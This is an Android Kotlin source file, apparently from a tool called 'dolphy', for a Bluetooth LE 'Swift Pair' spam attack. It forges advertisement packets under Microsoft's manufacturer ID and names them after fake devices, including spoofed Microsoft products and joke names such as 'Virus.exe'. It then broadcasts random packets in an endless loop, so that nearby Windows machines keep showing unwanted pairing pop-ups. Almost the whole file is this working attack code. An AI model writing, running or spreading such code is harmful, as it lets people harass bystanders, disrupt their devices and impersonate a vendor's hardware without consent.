package com.droid.dolphy

import android.bluetooth.le.AdvertiseData
import java.io.ByteArrayOutputStream
import java.nio.charset.StandardCharsets
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors

class SwiftPairSpam : Spammer {

    private var _isSpamming = false
    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    private var blinkRunnable: Runnable? = null

    val normalNames = arrayOf(
        "Windows Protocol", "DLL Missing", "Download Windows 12",
        "Microsoft Bluetooth Keyboard", "Microsoft Arc Mouse",
        "Microsoft Surface Ergonomic Keyboard", "Microsoft Surface Precision Mouse",
        "Microsoft Modern Mobile Mouse", "Microsoft Surface Mobile Mouse",
        "Microsoft Surface Headphones", "Microsoft Surface Laptop",
        "Microsoft Surface Pro", "Microsoft Surface Duo",
        "Microsoft Xbox Wireless Controller", "Microsoft Surface Earbuds",
        "Microsoft Surface Go", "Microsoft Surface Studio",
        "Microsoft Surface Book", "Microsoft Surface Hub",
        "Microsoft Surface Pen", "Microsoft Surface Dial",
        "Microsoft Surface Slim Pen", "Microsoft Surface Dock",
        "Microsoft Surface Thunderbolt Dock", "Microsoft Surface Audio",
        "Free VPN", "Your Mom's PC", "Your Dad's iPhone",
        "404 Device Not Found", "Blue Screen of Death", "Installing Windows 99...",
        "Virus.exe", "Trojan Horse", "Neighbor's Wi-Fi", "Pirated Windows",
        "Keyboard for Cats", "Mouse for Dogs", "Pizza Delivery Drone",
        "Smart Fridge", "Smart Light Bulb", "RoboVac 3000",
        "Google Eye", "Apple iPot", "Samsung Smart Toaster",
        "PlayStation 10", "Xbox Infinite", "Nintendo Switch Pro Max",
        "AI Calculator", "Time Travel Watch",
        "Cyber Sock", "USB Breadbox", "Bluetooth Fork",
        "Wi-Fi Toothbrush", "Quantum Toaster", "Meme Dispenser"
    )

    val headphoneNames = arrayOf(
        "Ars3nb HP",
        "BT Headset",
        "Stereo HP",
        "Wireless HP",
        "Audio HP",
        "Music HP",
        "Sound HP",
        "Bass HP",
        "BT Audio",
        "BT Stereo",
        "Air HP",
        "Mini HP",
        "Pro HP",
        "Ultra HP",
        "Max HP",
        "Lite HP",
        "Neo HP",
        "Echo HP",
        "Pulse HP",
        "Wave HP",
        "Noise HP",
        "Clear HP",
        "Prime HP",
        "Core HP",
        "Flex HP",
        "Zoom HP",
        "Sync HP",
        "Nova HP",
        "Aura HP",
        "Spark HP"
    )

    private fun generateAdvertiseData(isExtended: Boolean): Array<AdvertiseData> {
        val normalAds = normalNames.map { name ->
            val out = ByteArrayOutputStream()

            out.write(byteArrayOf(
                0x03,
                0x00,
                0x80.toByte()
            ))

            val finalName = if (isExtended) name else name.take(24)
            out.write(finalName.toByteArray(StandardCharsets.UTF_8))

            AdvertiseData.Builder()
                .addManufacturerData(0x0006, out.toByteArray())
                .build()
        }

        val headphoneAds = headphoneNames.map { name ->
            val out = ByteArrayOutputStream()

            out.write(byteArrayOf(
                0x03,
                0x01,
                0x80.toByte(),
                0xD7.toByte(), 0x2F, 0xD2.toByte(),
                0xF4.toByte(), 0x61, 0xE4.toByte(),
                0x04, 0x04, 0x00
            ))

            val finalName = if (isExtended) name else name.take(18)
            out.write(finalName.toByteArray(StandardCharsets.UTF_8))

            AdvertiseData.Builder()
                .addManufacturerData(0x0006, out.toByteArray())
                .build()
        }

        return (normalAds + headphoneAds).toTypedArray()
    }

    override fun start() {
        executor.execute {
            _isSpamming = true


            val isExtendedCapable = Helper.canUseExtendedAdvertising()
            val pool = generateAdvertiseData(isExtendedCapable)

            while (_isSpamming) {
                val advertiser = BluetoothAdvertiser()
                val data = pool.random()
                advertiser.advertise(data, null)
                com.droid.dolphy.trackBlePackets(1)
                try {
                    Thread.sleep(Helper.delay.toLong())
                } catch (_: InterruptedException) {
                    break
                }
                advertiser.stopAdvertising()
            }
            _isSpamming = false
        }
    }


    override fun stop() {
        _isSpamming = false
    }

    override fun isSpamming(): Boolean = _isSpamming



    override fun setBlinkRunnable(blinkRunnable: Runnable?) {
        this.blinkRunnable = blinkRunnable
    }

    override fun getBlinkRunnable(): Runnable? = blinkRunnable
}


